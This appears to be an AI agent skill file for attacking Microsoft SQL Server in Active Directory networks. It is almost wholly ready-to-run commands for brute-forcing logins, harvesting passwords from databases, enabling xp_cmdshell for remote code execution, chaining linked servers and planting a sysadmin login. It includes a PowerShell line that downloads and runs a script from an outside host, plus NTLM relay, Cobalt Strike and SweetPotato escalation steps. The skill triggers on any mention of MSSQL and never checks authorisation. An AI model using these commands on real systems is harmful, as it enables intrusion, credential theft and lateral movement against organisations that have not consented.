---
name: mssql-ad-abuse
description: How to enumerate and abuse Microsoft SQL Server in Active Directory environments. Use this skill whenever the user mentions MSSQL, SQL Server, database enumeration, trusted links, SQL injection, xp_cmdshell, or wants to perform MSSQL-based attacks in AD pentesting. This includes discovering MSSQL instances, enumerating databases, exploiting trusted links for lateral movement, and achieving RCE through SQL Server.
---

# MSSQL AD Abuse

A skill for enumerating and exploiting Microsoft SQL Server in Active Directory environments.

## When to Use This Skill

Use this skill when:
- You need to discover MSSQL instances in a network or domain
- You want to enumerate databases, tables, and columns in MSSQL servers
- You're looking to exploit trusted database links for lateral movement
- You need to achieve RCE through MSSQL (xp_cmdshell, linked servers)
- You're performing AD pentesting and MSSQL is in scope
- You want to abuse SQL Server for privilege escalation

## MSSQL Enumeration

### Using MSSQLPwner (Python)

MSSQLPwner is based on impacket and supports Kerberos authentication and link chain attacks.

```bash
# Interactive mode with Windows authentication
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with impersonation depth
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Execute custom assembly on current server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Execute on linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Execute command via stored procedures on linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# NTLM relay attack on linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Direct query execution
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieve password from linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password

# Brute force against multiple hosts
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
mssqlpwner hosts.txt brute -hl hashes.txt -ul users.txt
```

### Using PowerUpSQL (PowerShell)

```powershell
# Import the module
Import-Module .\PowerUpSQL.psd1

# Get local MSSQL instances
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

# Scan for MSSQL via UDP (no AD account needed)
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP -Verbose -Threads 10

# Test connections with discovered instances
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test

# Domain enumeration
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Test connections across domain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

# Get databases from accessible instances
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Dictionary attack for weak logins
Invoke-SQLAuditWeakLoginPw

# Try default credentials for common software
Get-SQLServerDefaultLoginPw
```

## Database Enumeration

```powershell
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a database
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get sample data from columns (search for sensitive keywords)
Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

# Execute custom query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

# Dump entire instance (generates CSVs)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search for keywords across all accessible databases
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

## MSSQL RCE

### Using PowerUpSQL

```powershell
# Execute OS command (automatically enables xp_cmdshell if needed)
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
```

### Manual RCE via xp_cmdshell

```sql
-- Enable advanced options
sp_configure 'show advanced options', 1; reconfigure;

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1; reconfigure;

-- Execute command
exec xp_cmdshell 'whoami'

-- Execute PowerShell
exec xp_cmdshell 'powershell -w hidden -enc [base64_payload]'
```

## Trusted Links Abuse

Trusted database links allow you to execute queries on linked servers using the trust relationship. These can be chained across forest trusts.

### Finding Trusted Links

```powershell
# Look for MSSQL links
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Crawl trusted links
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

# Execute query on all linked instances
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

# Enable xp_cmdshell on linked server
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

# Obtain shell via linked server
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

# Audit instance for vulnerabilities
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

# Escalate privileges
Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"
```

### Manual Link Discovery (SQL)

```sql
-- Find linked servers
select * from master..sysservers;
EXEC sp_linkedservers;

-- Query linked server
select * from openquery("dcorp-sql1", 'select * from master..sysservers')

-- First level RCE via OPENQUERY
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

-- Second level RCE (chained)
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

### Manual EXECUTE Method

```sql
-- Create user and grant admin on linked server
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"

-- Add to sysadmin role
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

### Using SharpSQLPwn

```bash
# Direct execution
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to execute cmd in> /cmd:whoami /impuser:sa

# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn> /cmd:whoami /impuser:sa
```

### Using Metasploit

```bash
use exploit/windows/mssql/mssql_linkcrawler
set RHOSTS <target>
set USERNAME <user>
set PASSWORD <pass>
set DEPLOY true  # For meterpreter session
exploit
```

## Local Privilege Escalation

The MSSQL service account typically has `SeImpersonatePrivilege`, allowing impersonation attacks.

### SweetPotato Technique

Use SweetPotato to impersonate the SYSTEM service:

```bash
# Via Cobalt Strike Beacon
execute-assembly SweetPotato.dll <service_name> <output_token>
```

This allows you to escalate from MSSQL service account to SYSTEM.

## Common Attack Patterns

### Pattern 1: Discovery → Enumeration → RCE

1. Discover MSSQL instances in domain
2. Enumerate databases and find sensitive data
3. Check for trusted links
4. Exploit links for RCE on other servers

### Pattern 2: Trusted Link Chain

1. Find initial MSSQL access
2. Crawl trusted links
3. Find misconfigured link with xp_cmdshell
4. Execute commands on target server

### Pattern 3: Credential Harvesting

1. Enumerate all accessible databases
2. Search for password columns
3. Extract credentials
4. Use for lateral movement

## Tools Reference

| Tool | Purpose | Platform |
|------|---------|----------|
| MSSQLPwner | Enumeration, link abuse, NTLM relay | Python |
| PowerUpSQL | Full MSSQL enumeration and abuse | PowerShell |
| SharpSQLPwn | Linked server exploitation | .NET |
| SweetPotato | Token impersonation | .NET |
| Metasploit | Link crawler module | Multi |

## Important Notes

- Always check if xp_cmdshell is enabled before attempting RCE
- Trusted links work across forest trusts
- Use proper quote escaping in OPENQUERY statements
- MSSQL service account often has SeImpersonatePrivilege
- Some attacks require sysadmin privileges on the linked server
- Document your findings for each instance you enumerate

## Next Steps

After initial enumeration:
1. Check for trusted links with `Get-SQLServerLink`
2. Search for sensitive data with keyword searches
3. Attempt RCE via xp_cmdshell or linked servers
4. Consider privilege escalation via SweetPotato
5. Use harvested credentials for lateral movement
